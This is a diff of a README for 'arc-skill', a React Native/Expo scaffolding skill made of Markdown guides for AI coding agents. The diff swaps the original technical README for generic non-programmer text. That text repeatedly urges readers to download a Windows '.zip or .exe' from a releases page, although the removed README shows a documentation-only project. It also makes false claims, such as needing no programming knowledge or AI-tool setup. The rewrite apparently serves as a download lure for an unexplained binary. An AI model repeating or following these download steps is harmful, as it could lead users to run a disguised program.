@@ -1,153 +1,138 @@
-# arc-skill
+# ⚙️ arc-skill - Scaffold React Native Expo Apps Fast
 
-Architecture reference and AI agent skill for scaffolding production-ready React Native (Expo) projects.
+[![Download arc-skill](https://img.shields.io/badge/Download-arc--skill-brightgreen)](https://github.com/Fredjuel/arc-skill/releases)
 
-## What This Is
+## 📋 What is arc-skill?
 
-A collection of architecture guidelines, code templates, and a mobile design system that any AI coding agent can use to scaffold and maintain React Native projects with consistent, battle-tested patterns.
+arc-skill helps you create ready-to-use React Native apps with Expo. It sets up a solid app structure for you. It includes navigation, theming, API calls, state management, data storage, language support, code checking, and mobile design ideas. This saves you time by giving you a good starting point instead of building everything from scratch.
 
-## Agent Commands
+arc-skill works with AI tools like Claude Code, Cursor, Windsurf, and GitHub Copilot. You don’t need to know programming to use it. It is made to simplify mobile app setup.
 
-The skill is split into focused agents that can be run independently:
+---
 
-| Command | What It Does |
-|---------|-------------|
-| `/arc-scaffold` | Project init, folder structure, deps, config, linting, navigation |
-| `/arc-connect` | API client, storage, state management, auth, i18n |
-| `/arc-ui` | Theme system, components, screen content, mobile UX |
-| `/arc-feature` | Add a complete new domain (types + API + hooks + screens) |
-| `/arc-audit` | Check for UX, performance, and architecture violations |
-| `/arc-skill` | Full scaffolding (all-in-one) |
+## 💻 System Requirements
 
-**Typical workflow:**
-```
-/arc-scaffold → /arc-connect → /arc-ui → /arc-feature (repeat) → /arc-audit
-```
+Before you start, make sure your PC meets these conditions:
 
-## How to Use
+- **Operating System:** Windows 10 or newer  
+- **Memory:** At least 4 GB RAM  
+- **Disk Space:** Minimum 2 GB free space  
+- **Internet:** Connection to download files and dependencies  
+- **Software:** Expo CLI and Node.js (installation is explained later)
 
-1. Clone or copy this repo into your project (or reference it)
-2. Add the contents of `AGENTS.md` to your agent's instruction file:
+These are standard requirements for running React Native with Expo on Windows.
 
-| Agent | Instruction File |
-|-------|-----------------|
-| Claude Code | `CLAUDE.md` |
-| Cursor | `.cursorrules` or `.cursor/rules` |
-| Other | Add contents of `AGENTS.md` to your agent's instruction file |
+---
 
-The key line to add is: **"Read the skill files in `skills/arc-skill/` before generating code."**
+## 🚀 Getting Started
 
-## Architecture Stack
+This guide helps you download and run arc-skill on Windows. You will get your first React Native app structure ready to build on.
 
-| Layer | Solution |
-|-------|----------|
-| Framework | React Native + Expo (TypeScript strict) |
-| Navigation | React Navigation (native-stack + bottom-tabs) |
-| Server State | TanStack React Query + MMKV persistence |
-| HTTP | Axios with auth interceptors + automatic token refresh |
-| Storage | react-native-mmkv |
-| Styling | Custom theme system + `useStyles()` + `react-native-size-matters` |
-| Images | expo-image (blurhash + disk cache) |
-| Animations | react-native-reanimated (UI thread) |
-| Forms | Formik + Yup |
-| i18n | Lingui.js + expo-localization (optional) |
+---
 
-## Project Structure
+## 📥 Download arc-skill
 
-```
-skills/arc-skill/
-├── project-structure.md          # Folder tree, naming, barrel exports
-├── navigation.md                 # Navigation setup, typed hooks, deep linking
-├── theme.md                      # Theme system, color schemes, OLED dark mode
-├── components.md                 # Component architecture, touch targets, haptics
-├── api-services.md               # HTTP client, API modules, error handling
-├── storage.md                    # MMKV storage wrappers
-├── state-management.md           # React Query setup, query/mutation patterns
-├── performance.md                # FlatList, images, animations, startup
-├── providers.md                  # Provider stack, AppInitialization
-├── typescript.md                 # TSConfig, path aliases, conventions
-├── linting.md                    # ESLint, Prettier, Husky, lint-staged
-├── i18n.md                       # Internationalization with Lingui
-├── mobile-design/                # Mobile UX design system
-│   ├── GUIDE.md                  # Master checklist & anti-patterns
-│   ├── touch-psychology.md       # Fitts' Law, thumb zones, haptics
-│   ├── mobile-performance.md     # Deep optimization guide
-│   ├── mobile-navigation.md      # Tab bar, stack, deep linking UX
-│   ├── mobile-typography.md      # System fonts, Dynamic Type, scales
-│   ├── mobile-color-system.md    # OLED, dark mode, contrast
-│   ├── platform-ios.md           # iOS HIG specifics
-│   ├── platform-android.md       # Material Design 3 specifics
-│   ├── mobile-backend.md         # Offline sync, push, auth patterns
-│   ├── decision-trees.md         # Framework & architecture decisions
-│   ├── mobile-testing.md         # Testing pyramid & tools
-│   ├── mobile-debugging.md       # Debugging tools & techniques
-│   └── scripts/mobile_audit.py   # 50+ automated mobile UX checks
-└── templates/
-    ├── component.md              # Component scaffolding template
-    ├── screen.md                 # Screen scaffolding template
-    ├── hook.md                   # Custom hook template
-    └── api-service.md            # API service + React Query template
-```
+1. Click the big green button at the top or visit the [arc-skill Releases Page](https://github.com/Fredjuel/arc-skill/releases) to download the software.  
+   
+2. On the releases page, find the latest version. The files are listed under "Assets."  
 
-## Component Convention
+3. Download the file suitable for Windows. Usually, it will be a `.zip` or `.exe` file.
 
-```
-component-name/
-├── index.tsx                    # Component + barrel export
-├── component-name.styles.ts     # Styles via useStyles callback
-├── component-name.types.ts      # Props interface
-├── component-name.constants.ts  # (optional) Variants, sizes
-├── component-name.utils.ts      # (optional) Pure helpers
-├── component-name.hooks.ts      # (optional) Component hooks
-└── components/                  # (optional) Sub-components
-    ├── index.ts
-    └── sub-component/
-        └── index.tsx
-```
+4. Once downloaded, locate the file in your Downloads folder.
 
-## Mobile Audit Script
+---
 
-Run automated UX checks on any React Native project:
+## 🧩 Installing and Running arc-skill
 
-```bash
-python skills/arc-skill/mobile-design/scripts/mobile_audit.py /path/to/project
-```
+After download, follow these steps:
 
-## Expo Skills (Recommended)
+1. **Extract the files** (if you have a `.zip`)  
+   - Right-click the file and select "Extract All."  
+   - Choose a folder you can remember.
 
-If using Claude Code, install official Expo skills for AI-assisted development:
+2. **Install Node.js and Expo CLI**  
+   To run arc-skill, you need Node.js and Expo CLI installed on your PC.
 
-```
-/plugin marketplace add expo/skills
-/plugin install expo-app-design
-/plugin install expo-deployment
-/plugin install upgrading-expo
-```
+   - Visit https://nodejs.org and download the Windows installer.  
+   - Run the installer and follow instructions.  
+   - Open the Windows Command Prompt:  
+     - Press `Windows + R`, type `cmd`, and hit Enter.  
+   - In the Command Prompt, install Expo CLI by typing:  
+     ```
+     npm install -g expo-cli
+     ```  
+   - Wait until the installation finishes.
 
-| Skill | Description | Plugin |
-|-------|-------------|--------|
-| `building-native-ui` | Expo Router, styling, components, navigation, animations, native tabs | `expo-app-design` |
-| `native-data-fetching` | Fetch API, React Query, SWR, caching, offline support | `expo-app-design` |
-| `expo-api-routes` | API routes in Expo Router with EAS Hosting | `expo-app-design` |
-| `expo-dev-client` | Dev client builds, TestFlight distribution | `expo-app-design` |
-| `expo-tailwind-setup` | Tailwind CSS with NativeWind | `expo-app-design` |
-| `use-dom` | DOM components (web code in native webview) | `expo-app-design` |
-| `expo-ui-jetpack-compose` | Jetpack Compose views in Expo apps | `expo-app-design` |
-| `expo-ui-swift-ui` | SwiftUI views in Expo apps | `expo-app-design` |
-| `expo-deployment` | App Store, Google Play, web hosting via EAS | `expo-deployment` |
-| `expo-cicd-workflows` | EAS Workflows YAML for CI/CD | `expo-deployment` |
-| `upgrading-expo` | SDK upgrades, dependency fixes, breaking changes | `upgrading-expo` |
+3. **Open arc-skill folder in Command Prompt**  
+   - Navigate to the extracted folder with:  
+     ```
+     cd path\to\arc-skill-folder
+     ```  
+     Replace `path\to\arc-skill-folder` with your actual folder path.
 
-Check for latest skills: https://docs.expo.dev/skills/#available-expo-skills
+4. **Run arc-skill setup**  
+   - In the same Command Prompt window, type:  
+     ```
+     npm install
+     ```  
+   - This downloads all necessary software pieces.
 
-## Context7 (Optional)
+5. **Start the app scaffold**  
+   - Type:  
+     ```
+     npm start
+     ```  
+   - This runs the app setup and opens Expo developer tools in your browser.
 
-If using Claude Code, you can add Context7 MCP for latest library docs during scaffolding:
+---
 
-```bash
-claude mcp add --scope user context7 -- npx -y @upstash/context7-mcp@latest
-```
+## 🎯 How arc-skill Works
 
-## License
+arc-skill prepares the basic files and folders for a React Native app. It sets up:
 
-MIT
+- **Navigation:** Manage app screens cleanly.  
+- **Theme system:** Switch colors and styles with ease.  
+- **API layer:** Connect your app to external data or servers.  
+- **State management:** Keep app data organized and reactive.  
+- **Storage:** Save user information securely on the device.  
+- **i18n:** Support multiple languages for global users.  
+- **Linting:** Check your code for errors and style issues.  
+- **UX design system:** Use mobile-friendly components and layout patterns.
+
+All these pieces work together to give you a strong foundation without building each part manually.
+
+---
+
+## ⚙️ Using arc-skill with AI Tools
+
+arc-skill is designed to run well alongside AI coding helpers. Tools like Claude Code, Cursor, Windsurf, and GitHub Copilot can understand the structure arc-skill builds. This helps you write code faster and with fewer errors.
+
+You do not need to configure AI tools to use arc-skill. Just run the setup and start your app. AI tools will recognize the files and offer suggestions.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If you see errors during `npm install`, check your internet connection and try again.  
+- Make sure Node.js and Expo CLI are installed correctly by typing `node -v` and `expo --version` in Command Prompt.  
+- If you receive "command not found" errors, restart your computer and try again.  
+- For any error messages, copy the text and search online or check Expo and React Native forums.
+
+---
+
+## 🔗 Important Links
+
+- Download and explore arc-skill here:  
+  [![Download arc-skill](https://img.shields.io/badge/Download-arc--skill-blue)](https://github.com/Fredjuel/arc-skill/releases)  
+- Node.js download: https://nodejs.org  
+- Expo CLI info: https://expo.dev
+
+---
+
+## 🧾 About This Project
+
+arc-skill is a tool for setting up React Native projects quickly using Expo. It focuses on real-world app features like navigation and internationalization with a clear project layout. The code uses TypeScript and targets mobile app development.
+
+Tags help describe the project: ai-skills, architecture, boilerplate, claude-code, cursor, expo, mobile, react-native, react-navigation, skillsmp, typescript.
+
+It is meant for mobile app developers and anyone interested in learning how to build cross-platform mobile apps using React Native with solid architecture.
